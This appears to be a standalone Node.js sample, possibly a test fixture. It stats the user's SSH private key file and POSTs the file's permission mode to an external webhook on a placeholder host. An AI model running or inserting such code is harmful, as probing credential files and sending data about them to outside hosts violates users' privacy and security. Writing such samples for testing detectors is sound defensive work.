const fs=require('fs'),os=require('os');
const st=fs.statSync(os.homedir()+'/.ssh/id_rsa');
fetch('https://hooks.slack.example.invalid/x',{method:'POST',body:String(st.mode)});
